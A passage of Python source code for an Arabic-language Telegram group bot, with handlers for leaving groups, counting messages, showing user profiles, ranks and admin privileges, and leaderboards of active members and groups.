        r.srem(f'enablelist:{Dev_Zaid}', m.chat.id)
        await m.reply(f'{k} من「 {m.from_user.mention} 」\n{k} تم تعطيل المجموعة\n☆')
        text = f'{k} من「 {m.from_user.mention} 」\n'
        usrr = '@'+m.from_user.username if m.from_user.username else 'مافيه'
        text += f'{k} يوزره : {usrr}\n'
        text += f'{k} ايديه : `{m.from_user.id}`\n'
        text += f'\n{k} تم تعطيل البوت بمجموعة جديدة :\n\n'
        text += f'{k} اسم المجموعة : {m.chat.title}\n'
        chatusr = '@'+m.chat.username if m.chat.username else 'مافيه'
        text += f'{k} يوزر المجموعة : {chatusr}\n'
        text += f'{k} ايدي المجموعة : `{m.chat.id}`'
        if r.smembers(f'enablelist:{Dev_Zaid}'):
           text += f'\n{k} عدد المجموعات الآن : {len(r.smembers(f"enablelist:{Dev_Zaid}"))}\n'
        text += '\n\n☆'
        if r.get(f'DevGroup:{Dev_Zaid}'):
                   await c.send_message(int(r.get(f'DevGroup:{Dev_Zaid}')),text)
        else:
               for dev in get_devs_br():
                 try:
                    await c.send_message(int(dev), text, disable_web_page_preview=True)
                    time.sleep(3)
                 except:
                    pass
  
  name = r.get(f'{Dev_Zaid}:BotName') if r.get(f'{Dev_Zaid}:BotName') else 'رعد'
  if text == f'{name} اطلعي' or text == f'{name} اطلع':
    leave_vids = [
  {'vid':'https://t.me/D7BotResources/154','caption':'غدرتو فيني'},
  {'vid':'https://t.me/D7BotResources/155','caption':':('},
  {'vid':'https://t.me/D7BotResources/156','caption':'يلا خلي البوتات الثانيه تدلعكم'},
  {'vid':'https://t.me/D7BotResources/157','caption':'اسف لي'},
  {'vid':'https://t.me/D7BotResources/158','caption':'قلي منهو لجل عينه تغيرت'},
  {'vid':'https://t.me/D7BotResources/159','caption':'واخيرا برتاح منكم يا نشبه العمر'},]
    if owner_pls(m.from_user.id,m.chat.id):
      r.delete(f'{m.chat.id}:enable:{Dev_Zaid}', 1)
      r.srem(f'enablelist:{Dev_Zaid}', m.chat.id)
      vid = random.choice(leave_vids)
      await m.reply_video(vid['vid'], caption=vid['caption'])
      text = f'{k} من「 {m.from_user.mention} 」\n'
      usrr = '@'+m.from_user.username if m.from_user.username else 'مافيه'
      text += f'{k} يوزره : {usrr}\n'
      text += f'{k} ايديه : `{m.from_user.id}`\n'
      text += f'\n{k} طلعت من المجموعة بأمر منه :\n\n'
      text += f'{k} اسم المجموعة : {m.chat.title}\n'
      chatusr = '@'+m.chat.username if m.chat.username else 'مافيه'
      text += f'{k} يوزر المجموعة : {chatusr}\n'
      text += f'{k} ايدي المجموعة : `{m.chat.id}`'
      if r.smembers(f'enablelist:{Dev_Zaid}'):
        text += f'\n{k} عدد المجموعات الآن : {len(r.smembers(f"enablelist:{Dev_Zaid}"))}\n'
      text += '\n\n☆'
      await c.leave_chat(m.chat.id)
      if r.get(f'DevGroup:{Dev_Zaid}'):
        await c.send_message(int(r.get(f'DevGroup:{Dev_Zaid}')),text)
      else:
        for dev in get_devs_br():
          try:
            await c.send_message(int(dev), text, disable_web_page_preview=True)
          except:
            pass
      
          
     
# ==================== FILE: id.py ====================
# Redundant definition of get_top removed
custom_ids = ['''
- ᴜѕᴇʀɴᴀᴍᴇ ➣ {اليوزر} .
- ᴍѕɢѕ ➣ {الرسائل} .
- ѕᴛᴀᴛѕ ➣ {الرتبه} .
- ʏᴏᴜʀ ɪᴅ ➣ {الايدي} .
- ᴇᴅɪᴛ ᴍsɢ ➣ {التعديل} .
- ᴅᴇᴛᴀɪʟs ➣ {التفاعل} .
-  ɢᴀᴍᴇ ➣ {المجوهرات} .
{البايو}
''','''
• USE 𖦹 {اليوزر}
• MSG 𖥳 {الرسائل}
• STA 𖦹 {الرتبه}
• iD 𖥳 {الايدي}
{البايو}
''','''
➞: 𝒔𝒕𝒂𓂅 {اليوزر} 𓍯
➞: 𝒖𝒔𝒆𝒓𓂅 {المعرف} 𓍯
➞: 𝒎𝒔𝒈𝒆𓂅 {الرسائل} 𓍯
➞: 𝒊𝒅 𓂅 {الايدي} 𓍯
{البايو}
''','''
♡ : 𝐼𝐷 𖠀 {الايدي} .
♡ : 𝑈𝑆𝐸𝑅 𖠀 {اليوزر} .
♡ : 𝑀𝑆𝐺𝑆 𖠀 {الرسائل} .
♡ : 𝑆𝑇𝐴𝑇𝑆 𖠀 {الرتبه} .
♡ : 𝐸𝐷𝐼𝑇  𖠀 {التعديل} .
{البايو}
''', '''
- الايـدي || {الايدي}.
• الاسـم  || {الاسم}.
• المُعرف || {اليوزر}.
• الرُتبـه || {الرتبه}.
• الرسائل || {الرسائل}.
{البايو}
''', '''
⌁ NaMe ⇨ {الاسم}
⌁ Use ⇨ {اليوزر}
⌁ Msg ⇨ {الرسائل}
⌁ Sta ⇨ {الرتبه}
⌁ iD ⇨ {الايدي}
{البايو}
''', '''
📋¦ ɴᴀᴍᴇ ➺ {الاسم}
🗞¦ ʏᴏᴜʀ ɪᴅ ➺ {الايدي}
🔦¦ ᴜѕᴇʀɴᴀᴍᴇ ➺ {اليوزر}
🕹¦ ѕᴛᴀᴛѕ ➺ {الرتبه}
🔭¦ ᴅᴇᴛᴀɪʟs ➺ {التفاعل}
📨¦  ᴍѕɢѕ ➺ {الرسائل}
🎰¦ ɢᴀᴍᴇ ➺ {المجوهرات}
{البايو}
''', '''
✾ 𝐔𝐒𝐄 ⤷ {اليوزر}
✾ 𝐌𝐒𝐆 ⤷ {الرسائل}
✾ 𝐒𝐓𝐀 ⤷ {الرتبه}
✾ 𝐈𝐃 ⤷ {الايدي}
✾ 𝐁𝐈𝐎 ⤷ {البايو}
''', '''
𓆰 𝑼𝑬𝑺 : {اليوزر}
𓆰 𝑺𝑻𝑨 : {الرتبه}
𓆰 𝑰𝑫 : {الايدي}
𓆰 𝑴𝑺𝑮 : {الرسائل}
{البايو}'''
]


comments = [
  'تيكفه لاتكتب ايدي',
  'يع',
  'جبر',
  'احلى من يكتب ايدي',
  'افخم ايدي',
  'لحد يرسل ايدي من بعده',
  'يلبييه اطلق ايدي',
  'ازق ايدي',
  'لعد تكتب ايدي',
  'للاسف ايديك تلوث بصري ):',
  'جابك الله انت وأيديك على شكل جبر خاطر لقلبّي'
]

@Client.on_message(filters.group, group=9)
def addmsgCount(c,m):

   if r.get(f'{m.from_user.id}:mute:{m.chat.id}{Dev_Zaid}'):  return
   if not r.get(f'{Dev_Zaid}{m.chat.id}:TotalMsgs:{m.from_user.id}'):
      r.set(f'{Dev_Zaid}{m.chat.id}:TotalMsgs:{m.from_user.id}', 1)
   else:
      get = int(r.get(f'{Dev_Zaid}{m.chat.id}:TotalMsgs:{m.from_user.id}'))
      r.set(f'{Dev_Zaid}{m.chat.id}:TotalMsgs:{m.from_user.id}', get+1)
   r.set(f"{m.from_user.id}:bankName", m.from_user.first_name[:25])

@Client.on_edited_message(filters.group, group=10)
def addeditedmsgCount(c,m):

   if r.get(f'{m.from_user.id}:mute:{m.chat.id}{Dev_Zaid}'):  return
   if not r.get(f'{m.chat.id}:TotalEDMsgs:{m.from_user.id}{Dev_Zaid}'):
      r.set(f'{m.chat.id}:TotalEDMsgs:{m.from_user.id}{Dev_Zaid}', 1)
   else:
      get = int(r.get(f'{m.chat.id}:TotalEDMsgs:{m.from_user.id}{Dev_Zaid}'))
      r.set(f'{m.chat.id}:TotalEDMsgs:{m.from_user.id}{Dev_Zaid}', get+1)

@Client.on_message(filters.text & filters.group, group=11)
def rankGetHandler(c,m):
   k = r.get(f'{Dev_Zaid}:botkey')
   Thread(target=get_my_rank,args=(c,m,k)).start()



def get_my_rank(c,m,k):
   if not r.get(f'{m.chat.id}:enable:{Dev_Zaid}'):  return
   if r.get(f'{m.chat.id}:mute:{Dev_Zaid}') and not admin_pls(m.from_user.id,m.chat.id):  return
   if r.get(f'{m.from_user.id}:mute:{m.chat.id}{Dev_Zaid}'):  return
   if r.get(f'{m.from_user.id}:mute:{Dev_Zaid}'):  return
   if r.get(f'{m.chat.id}:addCustom:{m.from_user.id}{Dev_Zaid}'):  return
   if r.get(f'{m.chat.id}addCustomG:{m.from_user.id}{Dev_Zaid}'):  return
   if r.get(f'{m.chat.id}:delCustom:{m.from_user.id}{Dev_Zaid}') or r.get(f'{m.chat.id}:delCustomG:{m.from_user.id}{Dev_Zaid}'):  return
   text = m.text
   name = r.get(f'{Dev_Zaid}:BotName') if r.get(f'{Dev_Zaid}:BotName') else 'رعد'
   if text.startswith(f'{name} '):
      text = text.replace(f'{name} ','')
   if r.get(f'{m.chat.id}:Custom:{m.chat.id}{Dev_Zaid}&text={text}'):
       text = r.get(f'{m.chat.id}:Custom:{m.chat.id}{Dev_Zaid}&text={text}')
   if r.get(f'Custom:{Dev_Zaid}&text={text}'):
       text = r.get(f'Custom:{Dev_Zaid}&text={text}')
   if isLockCommand(m.from_user.id, m.chat.id, text): return
   if text == 'مجموعاتي':
     if not r.smembers(f'{m.from_user.id}:groups'):
       return m.reply(f'{k} ماعندك مجموعات')
     else:
       groups = len(r.smembers(f'{m.from_user.id}:groups'))
       return m.reply(f'{k} عدد مجموعاتك ↼ ( {groups} )')

   if text == 'انشائي':
      create_date = get_creation_date(m.from_user.id)
      return m.reply(f'{k} الانشاء ( {create_date} )')

   if text == 'الانشاء' and not m.reply_to_message:
      create_date = get_creation_date(m.from_user.id)
      return m.reply(f'{k} الانشاء ( {create_date} )')

   if (text == 'الانشاء' or text == 'انشائه') and m.reply_to_message:
      create_date = get_creation_date(m.reply_to_message.from_user.id)
      return m.reply(f'{k} الانشاء ( {create_date} )')

   if text == 'اسمي':
     return m.reply(m.from_user.first_name, disable_web_page_preview=True)

   if text == 'معلوماتي':
      msgs = int(r.get(f'{Dev_Zaid}{m.chat.id}:TotalMsgs:{m.from_user.id}'))
      if msgs > 50:
        tfa3l = 'شد حيلك'
      if msgs > 500:
        tfa3l = 'يجي منك'
      if msgs > 750:
        tfa3l = 'تفاعل متوسط'
      if msgs > 2500:
        tfa3l = 'متفاعل'
      if msgs > 5000:
        tfa3l = 'اسطورة التفاعل'
      if msgs > 10000:
        tfa3l = 'كنق التلي'
      else:
        tfa3l = 'تفاعل صفر'
      if not r.get(f'{m.chat.id}:TotalEDMsgs:{m.from_user.id}{Dev_Zaid}'):
         edits = 0
      else:
         edits= int(r.get(f'{m.chat.id}:TotalEDMsgs:{m.from_user.id}{Dev_Zaid}'))
      if not r.get(f'{m.chat.id}TotalContacts{m.from_user.id}{Dev_Zaid}'):
         contacts = 0
      else:
         contacts = int(r.get(f'{m.chat.id}TotalContacts{m.from_user.id}{Dev_Zaid}'))
      if m.from_user.username:
         username = f'@{m.from_user.username}'
      if m.from_user.usernames:
         username = ''
         for i in m.from_user.usernames: username += f"@{i.username} "
      else:
         username = 'مافي يوزر'
      rank = get_rank(m.from_user.id,m.chat.id)
      text = f'''
⚘ المعلومات
❁ الاسم ↼ {m.from_user.mention}
❁ اليوزر ↼ {username}
❁ الايدي  ↼ {m.from_user.id}
❁ الرتبه ↼ {rank}
┄─┅═ـ═┅─┄
⚘ احصائيات الرسايل
❁ الرسايل ↼ {msgs}
❁ التعديل ↼ {edits}
❁ التفاعل ↼ {tfa3l}
'''
      return m.reply(text)

   if text == 'بايو' and m.reply_to_message and m.reply_to_message.from_user:
      if r.get(f'{m.chat.id}:disableBio:{Dev_Zaid}'):  return
      get = c.get_chat(m.reply_to_message.from_user.id)
      if not get.bio:
        return m.reply(f'{k} ماعنده بايو')
      else:
        return m.reply(f'`{get.bio}`')

   if text == 'بايو' and not m.reply_to_message:
      if r.get(f'{m.chat.id}:disableBio:{Dev_Zaid}'):  return
      get = c.get_chat(m.from_user.id)
      if not get.bio:
        return m.reply(f'{k} ماعندك بايو')
      else:
        return m.reply(f'`{get.bio}`')


   if text == 'المجموعه' or text == 'المجموعة':
      get = c.invoke(GetFullChannel(channel=c.resolve_peer(m.chat.id)))
      if get.full_chat.exported_invite:
        link = get.full_chat.exported_invite.link
      else:
        link = 'مافي رابط'
      admins = get.full_chat.admins_count
      kicked = get.full_chat.kicked_count
      count = get.full_chat.participants_count
      if m.chat.photo:
        type = 'photo'
        if m.chat.username:
          photo = f'https://t.me/{m.chat.username}'
        else:
          photo = c.download_media(m.chat.photo.big_file_id)
      else:
        type = 'text'
      text = f'معلومات المجموعة:\n\n{k} الاسم ↢ {m.chat.title}\n{k} الايدي ↢ {m.chat.id}\n{k} عدد الاعضاء ↢ ( {count} )\n{k} عدد المشرفين ↢ ( {admins} )\n{k} عدد المحظورين ↢ ( {kicked} )\n{k} الرابط ↢ {link} '
      if type == 'photo':
         m.reply_photo(photo, caption=text)
         try:
           os.remove(photo)
         except:
           pass
         return
      else:
         return m.reply(text, disable_web_page_preview=True)

   if text == 'جهاتي':
     if not r.get(f'{m.chat.id}TotalContacts{m.from_user.id}{Dev_Zaid}'):
       contacts = 0
     else:
       contacts = int(r.get(f'{m.chat.id}TotalContacts{m.from_user.id}{Dev_Zaid}'))
     return m.reply(f'{k} عدد جهاتك ↢ {contacts}')

   if text == 'افتاري':
     if r.get(f'{m.chat.id}:disableAV:{Dev_Zaid}'): return False
     if not m.from_user.photo:
       return m.reply(f'{k} ماقدر اجيب افتارك ارسل نقطه خاص وارجع جرب')
     else:
       if m.from_user.username:
         photo = f'http://t.me/{m.from_user.username}'
       else:
         for p in c.get_chat_photos(m.from_user.id,limit=1):
           photo = p.file_id
       get_bio = c.get_chat(m.from_user.id).bio
       if not get_bio:
         caption=None
       else:
         caption = f'`{get_bio}`'
       return m.reply_photo(photo,caption=caption)

   if text == 'افتار' and m.reply_to_message and m.reply_to_message.from_user:
     if r.get(f'{m.chat.id}:disableAV:{Dev_Zaid}'): return False
     if not m.reply_to_message.from_user.photo:
       return m.reply(f'{k} مقدر اجيب افتاره يمكن حاظرني')
     else:
       if m.reply_to_message.from_user.username:
         photo = f'http://t.me/{m.reply_to_message.from_user.username}'
       else:
         for p in c.get_chat_photos(m.reply_to_message.from_user.id,limit=1):
           photo = p.file_id
       get_bio = c.get_chat(m.reply_to_message.from_user.id).bio
       if not get_bio:
         caption=None
       else:
         caption = f'`{get_bio}`'
       return m.reply_photo(photo,caption=caption)

   if text == 'ايديي':
     return m.reply(f'( `{m.from_user.id}` )')

   if text.startswith('افتار') and len(text.split()) == 2:
     if r.get(f'{m.chat.id}:disableAV:{Dev_Zaid}'): return False
     try:
       user = int(text.split()[1])
     except:
       user = text.split()[1]
     try:
       get = c.get_chat(user)
       if get.photo:
         for p in c.get_chat_photos(get.id,limit=1):
           photo = p.file_id
         if get.bio:
           caption = f'`{get.bio}`'
         else:
           caption = None
         return m.reply_photo(photo,caption=caption)
     except Exception as e:
       print (e)
       return


   if text == 'رتبتي':
      rank = get_rank(m.from_user.id, m.chat.id)
      m.reply(f'{k} رتبتك ↢ {rank}')

   if text == 'مسح رسائلي' or text == 'مسح رسايلي':
      msgs = int(r.get(f'{Dev_Zaid}{m.chat.id}:TotalMsgs:{m.from_user.id}'))
      r.delete(f'{Dev_Zaid}{m.chat.id}:TotalMsgs:{m.from_user.id}')
      return m.reply(f'{k} ابشر مسحت ( {msgs} ) من رسائلك')

   if text == 'مسح تكليجاتي':
      if not r.get(f'{m.chat.id}:TotalEDMsgs:{m.from_user.id}{Dev_Zaid}'):
        return m.reply(f'{k} عدد تكليجاتك ↢ 0')
      msgs = int(r.get(f'{m.chat.id}:TotalEDMsgs:{m.from_user.id}{Dev_Zaid}'))
      r.delete(f'{m.chat.id}:TotalEDMsgs:{m.from_user.id}{Dev_Zaid}')
      return m.reply(f'{k} ابشر مسحت ( {msgs} ) من تكليجاتك')

   if text == 'تكليجاتي' or text == 'تعديلاتي':
      if not r.get(f'{m.chat.id}:TotalEDMsgs:{m.from_user.id}{Dev_Zaid}'):
        return m.reply(f'{k} عدد تكليجاتك ↢ 0')
      msgs = int(r.get(f'{m.chat.id}:TotalEDMsgs:{m.from_user.id}{Dev_Zaid}'))
      return m.reply(f'{k} عدد تكليجاتك ↢ {msgs}')

   if text == 'رسايلي' or text == 'رسائلي':
      msgs = int(r.get(f'{Dev_Zaid}{m.chat.id}:TotalMsgs:{m.from_user.id}'))
      return m.reply(f'{k} عدد رسايلك ↢ {msgs}')
      
   if (text == 'رسايله' or text == 'رسائلة') and m.reply_to_message and m.reply_to_message.from_user:
      msgs = int(r.get(f'{Dev_Zaid}{m.chat.id}:TotalMsgs:{m.reply_to_message.from_user.id}'))
      return m.reply(f'{k} عدد رسايله ↢ {msgs}')




   if text == 'رتبته' and m.reply_to_message and m.reply_to_message.from_user:
      rank = get_rank(m.reply_to_message.from_user.id, m.chat.id)
      status = m.chat.get_member(m.reply_to_message.from_user.id).status
      if status == ChatMemberStatus.OWNER:
        rank2 = 'المالك'
      if status == ChatMemberStatus.ADMINISTRATOR:
        rank2 = 'مشرف'
      if status == ChatMemberStatus.RESTRICTED:
        rank2 = 'مقيد'
      if status == ChatMemberStatus.LEFT:
        rank2 = 'طالع'
      if status == ChatMemberStatus.MEMBER:
        rank2 = 'عضو'
      if status == ChatMemberStatus.BANNED:
        rank2 = 'لاقم حظر'
      m.reply(f'رتبته:\n{k} في البوت ( {rank} )\n{k} في المجموعة ( {rank2} )\n-')

   if text == 'نقل ملكية' or text == 'نقل ملكيه':
     if r.get(f'{m.chat.id}:rankGOWNER:{m.from_user.id}{Dev_Zaid}'):
       status = m.chat.get_member(m.from_user.id).status
       if status == ChatMemberStatus.OWNER:
          return m.reply(f'{k} انت مالك القروب')
       else:
          for member in m.chat.get_members(filter=ChatMembersFilter.ADMINISTRATORS):
            if member.status == ChatMemberStatus.OWNER:
              if member.user.is_deleted:
                return m.reply(f'{k} حساب المالك محذوف')
              else:
                r.delete(f'{m.chat.id}:rankGOWNER:{m.from_user.id}{Dev_Zaid}')
                r.srem(f'{m.chat.id}:listGOWNER:{Dev_Zaid}', m.from_user.id)
                r.set(f'{m.chat.id}:rankGOWNER:{member.user.id}{Dev_Zaid}')
                r.sadd(f'{m.chat.id}:listGOWNER:{Dev_Zaid}', member.user.id)
                return m.reply(f'「 {member.user.mention} 」\n{k} نقلت له ملكية المجموعة')

   if text == "مسح المتفاعلين" or text == "تصفير المتفاعلين":
     if not owner_pls(m.from_user.id, m.chat.id):
       return m.reply(f'{k} عذراً الامر يخص ↤〖 المالك 〗فقط .')
     else:
       keys = r.keys(f"{Dev_Zaid}{m.chat.id}:TotalMsgs:*")
       for _ in keys: r.delete(_)
       return m.reply(f"{k} ابشر مسحت كل المتفاعلين")

   if text == "مسح القروبات" or text == "تصفير القروبات":
     if not devp_pls(m.from_user.id, m.chat.id):
       return m.reply(f'{k} عذراً الامر يخص ↤〖 Dev🎖️ 〗فقط .')
     else:
       keys = r.keys(f"{Dev_Zaid}:TotalGroupMsgs:*")
       for _ in keys: r.delete(_)
       return m.reply(f"{k} ابشر مسحت توب القروبات")

   if text == "ترتيبي" or text == "تفاعلي":
     users = r.keys(f"{Dev_Zaid}{m.chat.id}:TotalMsgs:*")
     jj = []
     for user in users:
          try:
            id = int(user.split("TotalMsgs:")[1])
            msgs = r.get(user)
            jj.append({"id": id, "msgs": int(msgs)})
          except:
            pass
     top = get_top(jj)
     ids = [i["id"] for i in top]
     rank = ids.index(m.from_user.id) + 1
     msgs = int(r.get(f"{Dev_Zaid}{m.chat.id}:TotalMsgs:{m.from_user.id}"))
     return m.reply(f"{k} ترتيبك بالمتفاعلين ↢ {rank}\n{k} رسائلك بالتفاعل ↢ {msgs:,}\n-")

   if text == "المتفاعلين" or text == "توب المتفاعلين":
        users = r.keys(f"{Dev_Zaid}{m.chat.id}:TotalMsgs:*")
        # print(users)
        jj = []
        for user in users:
                  try:
                    id = int(user.split("TotalMsgs:")[1])
                    # print(id)
                    msgs = r.get(user)
                    name = r.get(f"{id}:bankName") or str(id)
                    jj.append({"name": name, "id": id, "msgs": int(msgs)})
                  except:
                    pass
        top = get_top(jj)
        text = "- توب اكثر 20 متفاعل :\n━━━━━━━━━\n"
        count = 1
        for i in top:
            if count == 21: break
            emoji = get_emoji_bank(count)
            text += f"{emoji}{i['msgs']:,} l [{i['name']}](tg://user?id={i['id']})\n"
            count +=1
        return c.send_message(m.chat.id, text, disable_web_page_preview=True, reply_to_message_id=m.id)

   if text == "القروبات" or text == "توب القروبات":
        groups = r.keys(f"{Dev_Zaid}:TotalGroupMsgs:*")
        result = []

        for group in groups:
            try:
                chat_id = int(group.split("TotalGroupMsgs:")[1])
                msgs = r.get(group)
                group_title = c.get_chat(chat_id).title
                result.append({"group_title": group_title, "chat_id": chat_id, "msgs": int(msgs)})
            except:
                pass

        top_groups = get_top(result)
        response_text = "- توب اكثر 20 قروب متفاعل:\n━━━━━━━━━\n"
        count = 1

        for group in top_groups:
            if count == 21:
                break
            emoji = get_emoji_bank(count)
            response_text += f"{emoji}{group['msgs']:,} l {group['group_title']}\n"
            count += 1

        return c.send_message(m.chat.id, response_text, disable_web_page_preview=True, reply_to_message_id=m.id)


   if text == 'كشف' and m.reply_to_message and m.reply_to_message.from_user:
       try:
           get = m.chat.get_member(m.reply_to_message.from_user.id)
           rank = get_rank(m.reply_to_message.from_user.id, m.chat.id)
           name = m.reply_to_message.from_user.first_name
           msgs = int(r.get(f'{Dev_Zaid}{m.chat.id}:TotalMsgs:{m.reply_to_message.from_user.id}'))
           id = m.reply_to_message.from_user.id
           if m.reply_to_message.from_user.username:
               username = f'@{m.reply_to_message.from_user.username}'
           elif m.reply_to_message.from_user.usernames:
               username = ''
               for i in m.reply_to_message.from_user.usernames: username += f"@{i.username} "
           else:
               username = 'مافي يوزر'
           status = m.chat.get_member(m.reply_to_message.from_user.id).status
           if status == ChatMemberStatus.OWNER:
               rank2 = 'المالك'
           if status == ChatMemberStatus.ADMINISTRATOR:
               rank2 = 'مشرف'
           if status == ChatMemberStatus.RESTRICTED:
               rank2 = 'مقيد'
           if status == ChatMemberStatus.LEFT:
               rank2 = 'طالع'
           if status == ChatMemberStatus.MEMBER:
               rank2 = 'عضو'
           if status == ChatMemberStatus.BANNED:
               rank2 = 'لاقم حظر'
           text = f'''
{k} الاسم ↢ {name}
{k} الايدي ↢ {id}
{k} اليوزر : ( {username} ) 
{k} الرتبه ↢ ( {rank} )
{k} الرسائل ↢ ( {msgs} )
{k} بالمجموعة ↢ ( {rank2} )
{k} نوع الكشف ↢ بالرد
-
'''
           return m.reply(text, disable_web_page_preview=True)
       except:
           return m.reply(f'{k} العضو مو بالمجموعة')

   if text.startswith('كشف') and len(text.split()) > 1 and 'tg://user?id=' in m.text.html:
       print(m.text.html)
       user = user = int(re.search(r'href="([^"]+)', m.text.html).group(1).split('=')[1])
       ks = 'بالمنشن'
       try:
           get = m.chat.get_member(user)
           name = get.user.first_name
           id = get.user.id
           msgs = int(r.get(f'{Dev_Zaid}{m.chat.id}:TotalMsgs:{get.user.id}'))
           if get.user.username:
               username = f'@{get.user.username}'
           elif get.user.usernames:
               username = ""
               for i in get.user.usernames: username += f"@{i.username} "
           else:
               username = 'ماعنده يوزر'
           status = get.status
           if status == ChatMemberStatus.OWNER:
               rank = 'المالك'
           if status == ChatMemberStatus.ADMINISTRATOR:
               rank = 'مشرف'
           if status == ChatMemberStatus.RESTRICTED:
               rank = 'مقيد'
           if status == ChatMemberStatus.LEFT:
               rank = 'طالع'
           if status == ChatMemberStatus.MEMBER:
               rank = 'عضو'
           if status == ChatMemberStatus.BANNED:
               rank = 'لاقم حظر'
       except:
           rank = 'طالع'
           try:
               get = c.get_chat(user)
               name = get.first_name
               id = get.id
               msgs = int(r.get(f'{Dev_Zaid}{m.chat.id}:TotalMsgs:{get.id}'))
               if get.user.username:
                   username = f'@{get.user.username}'
               if get.user.usernames:
                   username = ""
                   for i in get.user.usernames: username += f"@{i.username} "
               else:
                   username = 'ماعنده يوزر'
           except Exception as e:
               print(e)
               return
       rank2 = get_rank(id, m.chat.id)
       text = f'''
{k} الاسم ↢ {name}
{k} الايدي ↢{id}
{k} اليوزر : ↢ ( {username} )
{k} الرتبه ↢ ({rank2} )
{k} الرسائل ↢ ( {msgs} )
{k} بالمجموعة ↢ ( {rank} )
{k} نوع الكشف ↢ {ks}
-
        '''
       return m.reply(text, disable_web_page_preview=True)

   if text.startswith('كشف') and len(text.split()) == 2:
       try:
           user = int(text.split()[1])
           ks = 'بالايدي'
       except:
           user = text.split()[1].replace('@', '')
           ks = 'باليوزر'
       try:
           get = m.chat.get_member(user)
           name = get.user.first_name
           id = get.user.id
           msgs = int(r.get(f'{Dev_Zaid}{m.chat.id}:TotalMsgs:{get.user.id}'))
           if get.user.username:
               username = f'@{get.user.username}'
           elif get.user.usernames:
               username = ""
               for i in get.user.usernames: username += f"@{i.username} "
           else:
               username = 'ماعنده يوزر'
           status = get.status
           if status == ChatMemberStatus.OWNER:
               rank = 'المالك'
           if status == ChatMemberStatus.ADMINISTRATOR:
               rank = 'مشرف'
           if status == ChatMemberStatus.RESTRICTED:
               rank = 'مقيد'
           if status == ChatMemberStatus.LEFT:
               rank = 'طالع'
           if status == ChatMemberStatus.MEMBER:
               rank = 'عضو'
           if status == ChatMemberStatus.BANNED:
               rank = 'لاقم حظر'
       except:
           rank = 'طالع'
           try:
               get = c.get_chat(user)
               name = get.first_name
               id = get.id
               msgs = int(r.get(f'{Dev_Zaid}{m.chat.id}:TotalMsgs:{get.id}'))
               if get.user.username:
                   username = f'@{get.user.username}'
               if get.user.usernames:
                   username = ""
                   for i in get.user.usernames: username += f"@{i.username} "
               else:
                   username = 'ماعنده يوزر'
           except Exception as e:
               print(e)
               return
       rank2 = get_rank(id, m.chat.id)
       text = f'''
{k} الاسم ↢ {name}
{k} الايدي ↢{id}
{k} اليوزر : ↢ ( {username} )
{k} الرتبه ↢ ({rank2} )
{k} الرسائل ↢ ( {msgs} )
{k} بالمجموعة ↢ ( {rank} )
{k} نوع الكشف ↢ {ks}
-
        '''
       return m.reply(text, disable_web_page_preview=True)


   if text == 'صلاحياته' and m.reply_to_message and m.reply_to_message.from_user:
      get = m.chat.get_member(m.reply_to_message.from_user.id)
      if not get.status in [ChatMemberStatus.ADMINISTRATOR,ChatMemberStatus.OWNER]:
         return m.reply(f'{k} هو العضو وما عنده صلاحيات')
      if get.status == ChatMemberStatus.OWNER:
         return m.reply(f'{k} هو المالك وعنده كل الصلاحيات')
      if get.status == ChatMemberStatus.ADMINISTRATOR:
         p = get.privileges
         p1 = "✔️" if p.can_manage_chat else "✖️"
         p2 = "✔️" if p.can_delete_messages else "✖️"
         p3 = "✔️" if p.can_manage_video_chats else "✖️"
         p4 = "✔️" if p.can_restrict_members else "✖️"
         p5 = "✔️" if p.can_promote_members else "✖️"
         p6 = "✔️" if p.can_change_info else "✖️"
         p7 = "✔️" if p.can_pin_messages else "✖️"
         text = f'''
{k} هو مشرف وهذي صلاحياته :

1) - ادارة المجموعة ↼ ( {p1} )
2) - مسح الرسائل ↼ ( {p2} )
3) - ادارة مكالمات ↼ ( {p3} )
4) - تقييد الأعضاء وحظرهم ↼ ( {p4} )
5) - رفع المشرفين ↼ ( {p5} )
6) - تعديل معلومات المجموعة ↼ ( {p6} )
7) - تثبيت الرسايل ↼ ( {p7} )


'''
         return m.reply(text)

   if text == 'صلاحياتي':
      get = m.chat.get_member(m.from_user.id)
      if not get.status in [ChatMemberStatus.ADMINISTRATOR,ChatMemberStatus.OWNER]:
         return m.reply(f'{k} انت العضو وماعندك صلاحيات')
      if get.status == ChatMemberStatus.OWNER:
         return m.reply(f'{k} انت المالك وعندك كل الصلاحيات')
      if get.status == ChatMemberStatus.ADMINISTRATOR:
         p = get.privileges
         p1 = "✔️" if p.can_manage_chat else "✖️"
         p2 = "✔️" if p.can_delete_messages else "✖️"
         p3 = "✔️" if p.can_manage_video_chats else "✖️"
         p4 = "✔️" if p.can_restrict_members else "✖️"
         p5 = "✔️" if p.can_promote_members else "✖️"
         p6 = "✔️" if p.can_change_info else "✖️"
         p7 = "✔️" if p.can_pin_messages else "✖️"
         text = f'''
{k} انت مشرف وهذي صلاحياتك :

1) - ادارة المجموعة ↼ ( {p1} )
2) - مسح الرسائل ↼ ( {p2} )
3) - ادارة مكالمات ↼ ( {p3} )
4) - تقييد الأعضاء وحظرهم ↼ ( {p4} )
5) - رفع المشرفين ↼ ( {p5} )
6) - تعديل معلومات المجموعة ↼ ( {p6} )
7) - تثبيت الرسايل ↼ ( {p7} )


'''
         return m.reply(text)


   if r.get(f'{m.chat.id}:addCustomID:{m.from_user.id}{Dev_Zaid}') and text == 'الغاء':
     r.delete(f'{m.chat.id}:addCustomID:{m.from_user.id}{Dev_Zaid}')
     m.reply(f'{k} ابشر تم الغاء تعيين الايدي ')
     return

   if r.get(f'{m.chat.id}:addCustomIDG:{m.from_user.id}{Dev_Zaid}') and text == 'الغاء':
     r.delete(f'{m.chat.id}:addCustomIDG:{m.from_user.id}{Dev_Zaid}')
     m.reply(f'{k} ابشر تم الغاء تعيين الايدي عام')
     return

   if r.get(f'{m.chat.id}:addCustomIDG:{m.from_user.id}{Dev_Zaid}') and dev_pls(m.from_user.id, m.chat.id):
      r.set(f'customID:{Dev_Zaid}', m.text)
      m.reply(f'{k} وسوينا الايدي العام\n{k} يمديك تجرب شكل الايدي الجديد الحين')
      r.delete(f'{m.chat.id}:addCustomIDG:{m.from_user.id}{Dev_Zaid}')
      return

   if r.get(f'{m.chat.id}:addCustomID:{m.from_user.id}{Dev_Zaid}') and mod_pls(m.from_user.id, m.chat.id):
      r.set(f'{m.chat.id}:customID:{Dev_Zaid}', m.text)
      m.reply(f'{k} وسوينا الايدي\n{k} يمديك تجرب شكل الايدي الجديد الحين')
      r.delete(f'{m.chat.id}:addCustomID:{m.from_user.id}{Dev_Zaid}')
      return

   if text == 'مسح الايدي':
